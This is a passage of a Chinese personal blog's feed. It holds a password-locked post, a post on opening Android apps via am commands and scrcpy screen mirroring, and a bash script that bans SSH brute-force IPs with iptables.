    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry the password is incorrect." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="eb3a37d58903bc3c5da4f9a61fa39f3752f989398b0e60d8b7accb01dfb5fcf8">d313ab152dc986e66f29bff77bb393c2fed66bb69995c35379f766fe538e95ea6b449e4183766c538e3cb6ffc1e3864fe269da552339e7f3fd872d1afcb63317ab9597e7ff540bb3e42736166b510fe75c5c0d4a47d39e663c30ee11219c59c634d00edc5214b8e31eced8f694f85551bf0dca562e8ad49d11719fad9ac44e5129353d494e57ddedbeee13796aaadeff0fd1a1d6312bd46375ac573edb00b4a887854884ce7cfc95e2094aa4586d9a5c79c7f672df22c4131a364bae03d97242f83a615ce057a978a7f52175c6b8ffda6dbf702de414a269d72fc0b0592b0985539a408c9afa47b102ab60c238adb4a2c84b0af5bade1db46e78ae73d0df1b3b77f923ce984427f69f81d51ccdef3de9e1371fde9507a1061ed8c89f5231b802e6879532a943d0a9afb143091d74c5beac2452512ec9980b6741dd4f14111ecb67c28319ea60fa60e182714c35a00c24014163aea2d4778bfeec119502256975f76562f46c5a95820b7c3d5c4d1371b025d22595fdb502a7aae3595599ea145d5d002fd4eb39526bb61b8e0f258db7584596490a1125e0657bdc92929eac1fa112e31fcc8c0f00d59b8b9ecb8cce7d0bd5536347fec0304c7a2e71409eb6a1c409f12a7fb6470a78582b637fbb2a403aef54fb6f0050b9d283aa8ef3acf4d68fde34ece377665d7e50cffbac332a7df1cef4c69b13cc19a0f660123eb3278412e46c47382eac0369c4b34fa6e53ccb723ea18a5c3b33d937c2de1503d41b5226e9f861a68aae8feb8ec3da2b86535dea7c639d794d96496e3d60bee106c5c96d0f923c2d873f4038f92e0706ef1fb86d6fa9e2d2863d68fb3b017670869679d1426713b2f62d6739cf9bdabbdd0f20924ffc8a04e8a74e048480c3b055ef9acf44e48f34c68f00925433751af304e76f168f8849eade64a816341de378feb2237e9d16e59b196a7357db9a6c40967c5e5fc3a14cdb485dabf78ab74ee8e3e853b40c61c25f4befc48fb189c821c96a97eae53975c110190a1c550080ef12b18af094b4b21562acb36f92367e423a96944b66c1816497c559793f8acf10920db495da9874d615b6c22bfa91e87d4c86a7c961d41d1e447451bba08941f4a56da0012c155bd3a074f3bf4611f8a715ea5ccaf4a2bd4ff0c309964fc10601fe2232002c16f4d29e9a456709bf726ca30c802f65084d07cad2d574d76d9a12b958f530abf941491393925cd19841e2814b1e7675ec9f312219d25a45663d5e0777ce1a66acecf53556f678ab30a932a3b3cafc106d390525e6cefa554c3fe97b1489c0b8fe1b5c500146667b525ed1299d0b7f2779fcff9e7571307b0f65ae6f3bf0193a73ec757e184c345fc926f33ec0dee57e0dc8106acbdac242509b42a1283ccbbb82b76788579736da2397afc551d102479d94440365c8caf1bbe79625693f4a73d900154692f9251790da2ceb5d3b0b29ca0fa4eaaa884d88ceb6bdcb41849aade2dc481ef08b88d807ae295ab7195d05e3f474acae5feed7ac66bde1ecc903504b02119549c1b2b7a9a9b1a7875e0ed799f8bc2646b2e688cf5b6a7e964f8909058a945bdfde372489afed56850fc015f5e203f03a170670d3ff6caac3ded400ac2f36e1d06780e119ddc5bf0bc6490a93adb265dd0005e816aee91b860dab09c4606799799e3485e3f0f8377ce6f658c5b331b73507ee334f1058b2bba9acc14ed9045af6885172d4aad0ea1c22f4bf312dd12a66857fc0f768df0a980088e30b32f3dbd0ddc1e222a20e2c1e3b4668f5e98f518f364868806e4a5cfb9323fdaab60d53582fb1c5e7064da3f6ce774b54c037af32f38cf5aac3bf304668b024127a1dd62e87759dbe28fb092a9e3df594218da5d4ba9b0c0ca49df038f4178c40114be6accb94096e9c2ff1be6b450842420ef253374258c1c6ebaa7fc35f9ac433c26d04c74c7e6022bd7bd2c4af245d7cf2885d7dc8c42211e24d884c1e630581e10a56ae34a74879d8bcf7834932368247c8c748024365f86605a066bd5a348eaa830dbb41768ec56879d79452f8b6d7fa88a08dbb14f5bac5d1382f5a3e764cdb23ef6d0b04f618dea7069635c044bc6fd275ea3853baf0f82039d5148928767a8a5afe52b4a77548ff7d5d62222ebf12804aadb4ad4d2e721ef193a9abe576b74f55230209b15600b3a66ca6febff667b2a02a50473a192b85ea721bf12ea0d931e0cdd33c947595007d7987725e7f71ebb7305a7a4a04c028ad843bba391b8ea51f892a2fe2be9b5e938fe79278e7a1ae22f63d3c412ea7c63c266ae3c3d5088602265a3f7b887c59c42105a6340f5db88628a53e42075259cf5c8d18faeaba058e69fd3b2aa037bbb84d153e80e8f3f2998130809f690149adff483bfb200fdbe077b18df45ebb2fe1a455ba04214972ecccab5b5be6702f3804dd292d3fb698acef5ba29f1207e8fb88692c1c89377817874a616a81506857a7540b0034d8e9e79a56b9f6b495f7eded1a7be46048924273909b22e02a3b449209bd29163a1fdea94d4f99f055fd02980ac65662f02fe30a024ac2ea02d2935ce39809ba10b8c9937c6c1b3f92063656fda274fdd53817f5326306631ed25e9400a1c5ea69726b1be762a65671c6925e8f109cb70960c730af54884b6b967f7dd1f3bdab9b2b78b0a5538823311f65679fad95c98aa1682e694384171ac24bf9e1335814144c36d1d1a1dc5d2ec028d00d59b091063347a7d546769cd32ddeae947b854316a77d75a54335bd1673a10b5a8b360a787b2c5c70f81c0ec325e2cece7dce033a09fe88868e63b1b8217e6c1d9948202aede5efdecca624366e626617db5482d4413567b61c2c191546fb756cc9eb3baaaad28b3d7600c86e6397798f60f7fd368336fe4a0dd9ec75ded8f363d7a6f90000ce8d73c9b3cfb3cf624159a07e44d988f00e8493f76e05e6e7d406c75e8502a5443c57ee27dd5cc61cea17f331fab6f57727acac71a83c2bf5812c5831c61372360f1bce88aa39b04e37407e3b32b9bc92de24f45b78369776658b536e83016c583432534f4cbb8732013ff3bebf7aee702fca61c4872c23fc967cbdd7b0dce686f0b7c34dbeeb5554fc95b2ee357fea4d5dde03e8c538241a147f848963aa5feed4aecb8d758b2d792551a88caa4fc8f3094e60089ce3de20c3a7460c1f8d59e20e828d1051de091289c1e55e3f6b46de3033f26a273daccf70b108772da526bbd46a767c263fc49a4f0af9419608585fab0e61342c9123f74b282240ac59f6d32f7792995c2b5d2f59eeb887d7c7b9e3d7f324adf92153ed95c1e466680b6fabe5900c0a3900a72b1fe69bfc23516a21a63f13da287911ccf5d6086c2addb70bc1d340570dbc547e266056ebee619a7bc42b3fcd58f87c805724d1576c9aa5df65c2aa7e108831807eea6d41f96da7ccdd3d85381f5e0ae7d00e1d3e25afbeb56f788b3b421a18e64b9dc98f3a8e18b338d2afabef43cc7a62ccd92d038f89f7fbcd2a2711898d08bf1e549044ceb6a4ab8fcb53951f3ff771e503bdeb91413e92db9989a373dc5b0dd303ae8e976540504da35b9a02c1e9a2d5e851133c26b43957b57d02a2feed7d587e91501741ea06926ba68c4f0ccce0686335a1124badc010f0640624669f0d628b2e73d02edd0f9512681ab3a908e74ff807ae791d958e6b3f8d8d69ccfeba958da6b361b5624be62dcdbadc70c8fbc066dd62cd5e0d1c4e6ecc225c28a22cf06bd51ee7de38ec51646bb82968d7507f5c4451af7d7a3f6e3489a1c15f853c84b01c3d83587eaf11b3b638ae5e6e3d37903a7c6a3994b82f52d0a398d955f3a85c52d535a426287074c03320c2bac1147518760e887b70d6cccd1fa90b0d7bfe6ef3c99548e0a44b6218fba37fe0d445d8f49ccaf170d4d4004c9f6fa29c41086a91d7b2bbe1b508e587b8bd8dc2a6a69b747066ce951c770c49b92c924e83d5a2ece6690fee82c09e6448a34968292fcf8ae9e4732207e4d3c3fa9b5e534f4fe27bdf8431e0835db6d0e7abf8f2500247acd0ce2d7ff72788311dc91f8c39a72a87e6d0d9637eff59e704f23d554d8456db3229aecc728970c07c5715a2f021f101311a487cc965c777a3732647efe0d8090bac6fd55f9c6b50460cddf987960d1f0b7aa465298f5274e3c97a6835934060ef1426d3ad675dd32b24155acaa97f41cc79739270e2652a1a18862e8b1cf900186d26866d29f24c5994f9edc376a65e2735020ec363965e048d890d3191e1e93195ada394460632a75824551280b1a0985ed530a188de111dfbf785d94974eaa56e7b05c369db3fdce789c298c5f64f183ae4220c762e179684bbe975507bb5ec3d33a2594c8683883262133c35d4333fffa9baaa6804315dc05a874311ace63563fffd2392348de58894d42cedd11bc6284dc5ec9fa6736df36bf79596d83626642b56bf393143a54f272cd129862a68c7e16d1f4b6d85ddc2aa76e5ecbeba2a87de18f093bb4552024c7ce5fc2e0a50e4a2dc6971379474864ad95d4bea4475b718b1efe58f2849a5b13d17cb0f668132ee27c0838f7ea431f03304c7fd0cd25481b88c953d3e9918df7c67ead715ca4dafcf0d09b85c4ed6ebec9b1b6ecf0aa0f94befc3b742e845c07e95cb51bdbbcaf1509a7d27a1b79951cd914a44455c928ae828dec0dfac4cebd56bd616c3a2e9cbe3ff2b6284c07fe5ee4279f6a2c246da1a614da371dec0d532b8f2f68406f078888e5d5d13dd2e350509914461b7c66a6c4fcc664f6ba8741746788abbdeeb381623e958f0a278dc681ea80be9fbb661f43bf57c7f19a0223218b39bd549de8bcb475bfa62416bd646112f6f24803fb00e7d6ffb56b0fe776fc3d40df86f8dfd415ee953287edd9df4b93cab67e063be97d793aaa10f2feffacbf99cfd77200386c7a01654d0d7b149d407c4b7c8a5a278c77873c45bb53e772697a4d40e50d60a7013c859540c71c269ef86ada081ad47044a902dc342da4e72af721ae6d51af27320d4826e593d9f58c1a9772273107db9d3fd9de30cadbb36854049e905918e4bf9f9145d816c9616884888f2e7af997fcd2a668c407e52f6411d0e1fcf22cc5dc2d42b1c7fbdeb824fcafb049eba4e33545178b836439b92ea9fda4a4dd142b0c67252941d7a8644a37154508490d9adbdb4db5598305940f1c775bb6209d9a8744f67b17b617bd81570f45296d9f7f69bc4b87a3bbf192d3c3783d6730091b1b4c365fc7f8f0284f64fb6f0af02032bda2031ebd3e585a71e386982d4435f8954e2980a0e661e035d80d0e7b69bd49f587c2c2035886448416e0c336156f50f211bc9482b0a5f168d427bb7506b51d05f9439570c7461b189b0eb604e2d708d8c97781783c96c61b41772495732550858500dc5b0917fbf57fd9c319885c292cfe3df360187a0e13d1389c1cce4b7116c9e464d282387e8ca837f4ccda053fd511617b5cb929d3e1bade5c1bd8e786243112af7fc601bf6a7d431ff52713be0b78afed2c206abf636519697c97f6d5cb3d64b1ddbb11b1eb83cf51b1b02352f61bfa9780811566417459c41ee8b9ce68a9c595da89a05803fa9d78d6dd6edf7c0a488c2984849e6e6839f29e0ac56f071d1021b21a2c005b25bdb161dd4a4fe64b544a7d9f59e3c024e50d3b53b835621fdc14191d8623ceb61e2f1caf464894f41c648831edc6fc3813dc76b232bf20cd80f7744900b530137194d1aec63c672d61ff2667e78e497e654b1ae69258c765956f3c1049f33b18e4f025558a1d273d8f9045b70007c7c35ba231bbf18e99a95495556377d76cfd9886872932f30615724ff8e207f9f1916d02485ed1b35df065a739db2406afda474c467b3ed6dff6246f3a6c1963e90b754630ec2f15dbd31bd85cefb3fba8b4186ac85a301bdb8f4df0e85f458f49b6d7ec120f422741fa8934af2490eccd08eb63b54fb8b9f81fc13ab212b7048d3d775ff0c787aa19d77de052adda3be0ee3a4d63714df779b81e7b0e090f75afc749c042dccdf801c2433157342d6bd086ffedc31caf35ea24fb862e1b1bda9362e55ba2500661ffff422772c165c22a36bea923a1ee54d489ce1e0d3d4c08c44cb40978c53aa613034c2759223948decdc6272b2382c7f318e4de219ec6fd8b6beb97bdf54358b8d5b28dace9e009d03ea3f81154aed3943e9ae62af029f4419476b3c64c3b0cd359595c14e8d9f1daa56ac3d88db9c73570fba7ab2242d79debb298b9622649ec2759d2c23ce66905ac3912895a81f4931e98914f8fb184977905edb9239af41b7ffc5aac6dbed3917c0d89d289b5b41f6a9d643044ce3b5017a52c16c2cad142dd6987e6601af7d07518114f38243b44685aa16551317ddacc9241ad21baa7a9dedff8bc677c75ffff5ed64cef745dce4fde22c9d2c7c7e086b05ab1b596190081d106a5168dbf4f9d5b3b5fd0c76d69c719208a23b7facfa96102791e641165ae4e9df5f8837a07a7d8714cbfe017f66edf310e3f41dfd3242c30e688d6994f4be6d5c8323eefb49baab8cb2ccece362f8660b2a3f7f8f3a9006c4666bf0c9a730b1ee2ea0e642de25997601aa2d0c204a8bc2cc53df77e598c8e396ca2a62d6ae5f34ca72dd9aba1b352dc6d0dc4aaecaa68d57f7aad903b7256281002a120c172b834bc293221754724f66c5c3c07c82f33a4ac07524d815b8ed6e31b018a9193348bcfb357d1d889378918e3f6e04410b913bbb96899e844f57066c7eb6e181206c23d94ff3055b8136fbca8c0b06d2bc51a3d5191ffffcc29c88645ccdfb9c01ef09d2fe87eb95a10cb6bb45034726893a99a17fd8c7825574fc59b4856802de030ceb9aabba34a3c0d96091634135f4d866cc64261e7d24d6190bcb58a7dfb33153f27e4330ef465d440d8e5bca132b0b7c4ed5e31f5464f21ca9922e10c5c8df58b006ba42bc740a0aa483874957466f96a8f264f7082cb7b0ceac123e74116bc6ef4b2a92ccbe367ad6e375ed08a8b556b497fd401d328bd263cfba33e1453f13ee63893188f3c5c6de8e3d5edf228f8d09c0e230acbb23076ed0c4c40c29a9662d33f067b092e41fca7c59d42ccf8c75c775bfc061a8fb516e728494638decebbc4ec71494138fa5aed404a3c49a58584c9411ec45b9f438c7803f5d76197eb96afa5f868a334bc164a0abe034bbd8e17d2061ed38ac675a82177d29fdfb3e743d113c9e9c0bc31b6af6f0dc070ae82298450695225a1541346875d9fb549352e0e128876819148b0487f92664b1f98a12cceb189ccc6c9117194481aca6acb3c5a6d0231fa61443dae10ee03ef945e288ef3637b2fa066dce6117992433e5b0e33a88a226b8888d04196d7c2c2933162ad032ea43280871c216ba68373215036a77c65607f727bebc89c344ab77f129cbd24ba3600b701f56ccc5ded19e8a2728d41a79e358dbec9859b09e16f713341dc910a30594e74fef84aea82d714bc9056bd96485cf83dc132c22f08a3e79a08238787f1f7e7e3ac93adf98e176dae042ab526325f999bdcfb90ba761416d11e391c4c8d23caefd5a820f6d10b6847d00c05c6c59e1e8cf9368d9594c4764780be276f1bd5433fe9b8445db548865fba790c31b72c34a13b31ef652d376a1b4a3ca42e6d1a9e67f37e13cce4e8dd24120e2e813137aaad4682134e0cdfba392b4e7b7cdc51f63843e2b0f002281a053a21f3851b70e998ba3b5e0d2bb7526d6a485cb60075b8e0df95236a3fd053251bf8090ae18d8d93a29cb7c8e0e45bcef0db41f11f7622454f0539a976d7b817391500adb457a59a50987939e22d3fa109d048c7727ea0f103da286a8486ac200c1cbed4ed481202c3bd76c9cad6f39556296dcb0729188472a1916d59c339a7ff4dd85371a55129cb7aaa66a2f55e4ab5f442039e4db673e8263dcd7427dcdab48e29b6f7cf052f2631a927d42f6418ce3b786c85b24d081a1186e1f5a098c30622f9971e780a7b8dfece4a0644cbd6cda7b4573a3f2629cdb7102f9c9782948f413f717cb5754a149e32a8221343705f82b5069d1946751eac88d42ee8293e81336efa8c6d4d4c10d900eaf0901520fd8554d5779aeace996577c506520b18a20ea3322b2c798cf301d4f4c60c6b069e9d60c7786f09102377390d69907b375850b910beeb71de6ee4f03f22b1ebc7f1a38f570a782ca7712b201b02f2cd3c486a8942aa9dc411197f94cfd887ed8f4f1f126229861c1cf7646708c525becb8eb32a6a97ff5801f09b7ee4edc5cb80f6152b1fd70587da87ec1442822977d025b37508bf3208a0e1e820e10768e1b6590b8bd29ca8c4ceed242b2a76c151ad784b0777602ce6b7c68d4e067f40fcab39984a0906bba075ed7f2ec9dd8d08ab7bc2eaf93a35e9cf1d03f78d05b80af16389d8e92b00506ad49dadfdff9927d05fe51e352c5f0a4b7b599497bc4c6483ae45d3deb7cf7f05cc02ca83810d7ae1860629110ca144cb2a2b11616aaa03ec00a94d2edf1b0c4ac745c0365c108ecaca6f23d4f5666ee54bde082f68735e1e24f7a6fabd22c20a4769bde332cd268f2f79b2b0bc707263d7f82b1aae0b96de675a6cf25bd2f3a88fd4ec304c938738542c8e9904bee0eac1ed0f6e0fe768eab711baf6c5378ac29300f670a278799d0b6867ffc8782e2eb2f07054cc9fef4488fd27f611f13b749c3a50ef44a9d88a97e756b10326ea3a8b4dfc5ce843b4f152dded2899a081890b5bc6282f44e721e9131dc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>clash</tag>
      
      <tag>trojan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>adb命令打开app &amp; scrcpy 投屏</title>
    <link href="/2021/08/04/adb/"/>
    <url>/2021/08/04/adb/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><header><meta name="referrer" content="never"></header><p>昨天突然发现自己的平板在锁屏状态下也能够旋转了，这个功能藏得非常深，以至于在很长得一段时间里我都认为lineage os 不支持锁屏旋转。这也一直成为了我心里面觉得不舒服得一点，因为平板电脑嘛，最好每时每刻都是横着的，这才像个电脑嘛2333。</p><img src="https://sina.wuuconix.link/large/007YVyKcly1h2b92kfp7aj31n918gttu.jpg" alt="wuuconix's pad" style="zoom: 33%;" /><p>与此同时，我发现了同级菜单下一个好用得功能，就是在锁屏状态下在左边和在右边向上滑可以快速进入某个应用，比如浏览器之类的，快捷方式支持挺多应用的，但是没有juicessh，它算是我平常非常常用的一款软件了，因为我没事就ssh连上我的阿里云服务器看看有没有骇客攻击2333。但是快捷键不支持直接启动juicessh，我就比较失望，但是我看到了一个夺人眼球的选项：<code>执行指令</code>。我便产生了一个大胆的想法，我用执行指令的方式来打开juicessh如何呢？</p><h2 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h2><ul><li><p>在查阅了一番资料后，我发现这非常简单。</p></li><li><p>利用<code>am</code>命令即可。<code>am</code>是<code>activity manager</code>的缩写，安卓的每个app都有一个MainActivity，类似于c语言中的main函数，当运行这个MainActivity之后，这个app就能被运行起来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pm list packages | grep <span class="hljs-string">&quot;juice&quot;</span> <span class="hljs-comment">#得到juicessh的包名为package:com.sonelli.juicessh</span><br>dumpsys package com.sonelli.juicessh <span class="hljs-comment">#观察返回结果得到主活动为com.sonelli.juicessh/.activities.MainActivity</span><br>am start com.sonelli.juicessh/.activities.MainActivity <span class="hljs-comment">#打开主活动</span><br></code></pre></td></tr></table></figure></li><li><p>以下为演示视频</p></li></ul><p align="center"><iframe width="720"  height="405"   src='//player.bilibili.com/player.html?aid=462020136&bvid=BV1LL411n7x8&cid=382865300&page=1'    frameborder="0"     allowfullscreen    alt="adb命令打开app"></iframe><!-- <iframe src="//player.bilibili.com/player.html?aid=462020136&bvid=BV1LL411n7x8&cid=382865300&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe></p> --><ul><li>发到qq空间炫耀一番后，无敌的Vaala向我推荐了<a href="https://github.com/Genymobile/scrcpy">scrcpy</a>，名字意为<code>screen copy</code>。我下载后发现，这是一款非常简洁的手机投屏工具，相比于miui+那种下载一堆东西十分臃肿的辣鸡，这款投屏工具显得十分优秀。</li></ul><img src="https://sina.wuuconix.link/large/007YVyKcly1h2b9302389j31hc0u04qp.jpg" alt="scrcpy" style="zoom:50%;" /><ul><li>之后我还听从vaala的建议，在平板上运行了frp，没错，是直接在平板的里，而不是套娃在<code>termux</code>或者其他的模拟环境中，frp能够直接在android中运行这让我大为震惊，不过android也可以算linux就是了。现在我能够实现在任何地方，用任何网络直接通过adb connect命令连接到我的平板的shell，甚至配合scrcpy进行投屏（虽然这样会很卡就是了2333）</li></ul><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><ul><li>在玩了一天adb后我发现安卓设备有着非常高的可玩性，在大二下学期日益熟悉linux之后，安卓由于和linux极大的共同性，在命令方面几乎和linux一致，这也让我觉得安卓设备非常好上手。</li><li>但是安卓没有包管理器apt，不能随意下载东西</li><li>希望之后找到能够在安卓直接运行oh-my-zsh的方法 ( 那还要什么termux，安卓yyds！</li></ul><h2 id="吐槽"><a class="markdownIt-Anchor" href="#吐槽"></a> 吐槽</h2><ul><li><p>写这篇博客的时候，因为今天的主题和平常有些不太一样，需要更多的图片，而这个煞笔gitee不能直接访问1M以上的文件，导致我的图床几乎瘫痪，而且也不支持视频</p></li><li><p>直接放在服务器上做静态资源也不太合适，因为我的阿里云服务器带宽太拉跨了555，才5M，这放个图片都要加载半年，更别提视频了。</p></li><li><p>好在我找到了一个好方法，那就是qq空间2333 这篇博客的视频和图片都是用的qq空间的直链，希望不要挂掉（</p></li><li><p>markdown里写下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;never&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br></code></pre></td></tr></table></figure><p>就可以正常加载视频和图片！不然会提示&quot;该图片来自qq空间，未经授权禁止引用&quot;</p></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>adb</tag>
      
      <tag>android</tag>
      
      <tag>scrcpy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>将恶意ip加入ssh黑名单的自动化shell脚本实现  2.0</title>
    <link href="/2021/08/02/AutoBan2/"/>
    <url>/2021/08/02/AutoBan2/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>之前写的<a href="http://blog.wuuconix.xyz:8000/2021/07/29/AutoBan/">AutoBan 1.0脚本</a>在写好后的很长一段时间里都没什么人来爆破我的8022端口，以至于我觉得这种情况将一直持续下去。直到昨天晚上0点的时候，那时候我正在看奥运会回放，苏炳添的9.83创造了历史让我振奋不已，振奋之余 我向往常一样查看了一下frp的日志文件，让我吃惊的事情发生了。</p><p><img src="https://upyun.wuuconix.link/image-20210802143603443.png" alt="突发情况" /></p><p>有两个ip从9点半开始一直不间断地发起ssh请求，已经整整爆破了两个半小时了。</p><p>为什么我的autoban.sh没有ban掉它们？ 我看了一下我的autoban.log。</p><p><img src="https://upyun.wuuconix.link/image-20210802143813902.png" alt="autoban日志" /></p><p>我发现了我的AutoBan的重大问题，那个脚本是如何判断的呢？就是从frp日志文件里取出后三条记录，如果它们都是ssh请求，且它们都是同一个ip发起的，并且相互间隔不超过5s种，那就ban掉这个ip，条件太过严苛，在昨天晚上的情景中，首先每次请求的时间间隔大于5s，还是两个ip几乎交叉请求，我的自动ban脚本一代无能为力，同时还有一个不利因素，就是我之前因为没人来扫我，我就把脚本自动运行时间设置成了5分钟，也大大降低了脚本的威力。</p><h2 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h2><ul><li>由于一代脚本写的过于蹩脚，判断条件也过于拉跨，遂决定重构。</li><li>2代脚本的判断条件：<ol><li>筛选出最近一分钟的所有ssh记录。对其ip种类、个数进行统计。</li><li>大于3条请求的ip将被直接封禁。</li></ol></li><li>以下是花了一个中午写出来的Autoban 2.0</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">time=`<span class="hljs-built_in">date</span> <span class="hljs-string">&#x27;+%Y/%m/%d %H:&#x27;</span>``<span class="hljs-built_in">date</span> -d <span class="hljs-string">&#x27;1 minute ago&#x27;</span> <span class="hljs-string">&#x27;+%M&#x27;</span>`<span class="hljs-string">&#x27;:[00-59]&#x27;</span><br>num=`grep <span class="hljs-string">&quot;<span class="hljs-variable">$time</span>&quot;</span> /root/frp_0.37.0_linux_386/nohup.out | grep -c <span class="hljs-string">&#x27;ssh&#x27;</span>`  <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;` 过去一分钟的ssh请求个数为: <span class="hljs-variable">$num</span>&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban2.<span class="hljs-built_in">log</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$num</span> -ge 3 ]<br><span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;` 过去一分钟的ssh请求个数大于3，开始反击！&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban2.<span class="hljs-built_in">log</span><br>    ips=(`grep <span class="hljs-string">&quot;<span class="hljs-variable">$time</span>&quot;</span> /root/frp_0.37.0_linux_386/nohup.out | grep <span class="hljs-string">&#x27;ssh&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print substr($NF, 2, index($NF, &quot;:&quot;)-2 )&#125;&#x27;</span>`)<br>    <span class="hljs-built_in">declare</span> -A ipinfo<br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;ips[@]&#125;</span><br>    <span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">let</span> ipinfo[<span class="hljs-variable">$ip</span>]++<br>    <span class="hljs-keyword">done</span><br><br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;!ipinfo[@]&#125;</span> <span class="hljs-comment">#数组前面加叹号表示取下标，而不是取值</span><br>    <span class="hljs-keyword">do</span><br>        num=<span class="hljs-variable">$&#123;ipinfo[<span class="hljs-variable">$&#123;ip&#125;</span>]&#125;</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;` <span class="hljs-variable">$ip</span> 访问次数: <span class="hljs-variable">$num</span>&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban2.<span class="hljs-built_in">log</span><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$num</span> -ge 3 ]<br>        <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;` 该ip在1分钟内访问超过三次，已经锁定，准备开ban！&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban2.<span class="hljs-built_in">log</span><br>            iptables -I INPUT -p tcp -s <span class="hljs-variable">$ip</span> --dport 8022 -j DROP<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;` 已经成功ban掉恶意ip <span class="hljs-variable">$ip</span>&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban2.<span class="hljs-built_in">log</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">done</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h2 id="成果演示"><a class="markdownIt-Anchor" href="#成果演示"></a> 成果演示</h2><p><img src="https://upyun.wuuconix.link/image-20210802150125502.png" alt="效果" /></p><p><img src="https://upyun.wuuconix.link/image-20210802150202103.png" alt="locateip" /></p><p>ps：麻烦这两位老哥看到后不要再扫我了2333</p><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><ul><li>这次我脚本比一代精简了很多，代码行数是是一代的一半，但是却实现了更好的好恶意ip判断。</li><li>了解到了类似<code>grep '2021/08/02 15:10:[00-59]'</code>的筛选用法和 <code>grep -c</code>的对结果的行数统计功能</li><li>了解到了<code>date -d '1 minute ago' '+%M</code>这种返回一分钟前的分钟数这种看似不可思议的究极智能的用法。</li><li>了解到了grep 配合上管道符<code>|</code>，实现在将前一个grep的结果作为后一个grep的输入，实现多关键字匹配的问题。</li><li>了解到了awk命令里强大的内置函数，熟悉的substr, index，梦回c++。</li><li>初次见到了declare申明变量的关键字和let关键字，let关键字让丑陋的<code>(())</code>消失了。</li><li>了解了shell中遍历数组的两种方法 <code>for ip in $&#123;ips[@]&#125;</code> 表示便利数组里的值，而 <code>for ip in $&#123;!ipinfo[@]&#125;</code> 即在数组名前加上叹号，则表示遍历下标。</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ssh</tag>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用Hastebin实现简洁高效的代码分享</title>
    <link href="/2021/08/01/paste/"/>
    <url>/2021/08/01/paste/</url>
    
